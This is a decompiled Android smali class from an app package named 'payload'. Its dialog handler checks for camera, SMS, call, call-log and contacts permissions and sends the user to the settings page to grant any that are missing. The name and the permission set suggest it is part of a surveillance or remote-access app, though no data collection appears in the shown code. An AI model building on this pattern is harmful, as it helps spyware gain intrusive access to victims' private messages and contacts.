.class Lcom/mycompany/payload/MainActivity$100000002;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Landroid/content/DialogInterface$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/mycompany/payload/MainActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000002"
.end annotation


# instance fields
.field private final this$0:Lcom/mycompany/payload/MainActivity;


# direct methods
.method constructor <init>(Lcom/mycompany/payload/MainActivity;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/mycompany/payload/MainActivity$100000002;->this$0:Lcom/mycompany/payload/MainActivity;

    return-void
.end method

.method static access$0(Lcom/mycompany/payload/MainActivity$100000002;)Lcom/mycompany/payload/MainActivity;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/mycompany/payload/MainActivity$100000002;->this$0:Lcom/mycompany/payload/MainActivity;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public onClick(Landroid/content/DialogInterface;I)V
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/DialogInterface;",
            "I)V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 103
    move-object v0, p0

    move-object v1, p1

    move v2, p2

    move-object v7, v0

    iget-object v7, v7, Lcom/mycompany/payload/MainActivity$100000002;->this$0:Lcom/mycompany/payload/MainActivity;

    const-string v8, "android.permission.CAMERA"

    invoke-virtual {v7, v8}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v7

    const/4 v8, 0x0

    if-ne v7, v8, :cond_0

    move-object v7, v0

    iget-object v7, v7, Lcom/mycompany/payload/MainActivity$100000002;->this$0:Lcom/mycompany/payload/MainActivity;

    const-string v8, "android.permission.READ_SMS"

    invoke-virtual {v7, v8}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v7

    const/4 v8, 0x0

    if-ne v7, v8, :cond_0

    move-object v7, v0

    iget-object v7, v7, Lcom/mycompany/payload/MainActivity$100000002;->this$0:Lcom/mycompany/payload/MainActivity;

    const-string v8, "android.permission.SEND_SMS"

    invoke-virtual {v7, v8}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v7

    const/4 v8, 0x0

    if-ne v7, v8, :cond_0

    move-object v7, v0

    iget-object v7, v7, Lcom/mycompany/payload/MainActivity$100000002;->this$0:Lcom/mycompany/payload/MainActivity;

    const-string v8, "android.permission.CALL_PHONE"

    invoke-virtual {v7, v8}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v7

    const/4 v8, 0x0

    if-ne v7, v8, :cond_0

    move-object v7, v0

    iget-object v7, v7, Lcom/mycompany/payload/MainActivity$100000002;->this$0:Lcom/mycompany/payload/MainActivity;

    const-string v8, "android.permission.READ_CALL_LOG"

    invoke-virtual {v7, v8}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v7

    const/4 v8, 0x0

    if-ne v7, v8, :cond_0

    move-object v7, v0

    iget-object v7, v7, Lcom/mycompany/payload/MainActivity$100000002;->this$0:Lcom/mycompany/payload/MainActivity;

    const-string v8, "android.permission.READ_CONTACTS"

    invoke-virtual {v7, v8}, Lcom/mycompany/payload/MainActivity;->checkSelfPermission(Ljava/lang/String;)I

    move-result v7

    const/4 v8, 0x0

    if-ne v7, v8, :cond_0

    .line 109
    :goto_0
    return-void

    .line 106
    :cond_0
    new-instance v7, Landroid/content/Intent;

    move-object v10, v7

    move-object v7, v10

    move-object v8, v10

    const-string v9, "android.settings.APPLICATION_DETAILS_SETTINGS"

    invoke-direct {v8, v9}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    move-object v4, v7

    .line 107
    const-string v7, "package"

    move-object v8, v0

    iget-object v8, v8, Lcom/mycompany/payload/MainActivity$100000002;->this$0:Lcom/mycompany/payload/MainActivity;

    invoke-virtual {v8}, Lcom/mycompany/payload/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    check-cast v9, Ljava/lang/String;

    invoke-static {v7, v8, v9}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    move-object v5, v7

    .line 108
    move-object v7, v4

    move-object v8, v5

    invoke-virtual {v7, v8}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    move-result-object v7

    .line 109
    move-object v7, v0

    iget-object v7, v7, Lcom/mycompany/payload/MainActivity$100000002;->this$0:Lcom/mycompany/payload/MainActivity;

    move-object v8, v4

    invoke-virtual {v7, v8}, Lcom/mycompany/payload/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0
.end method
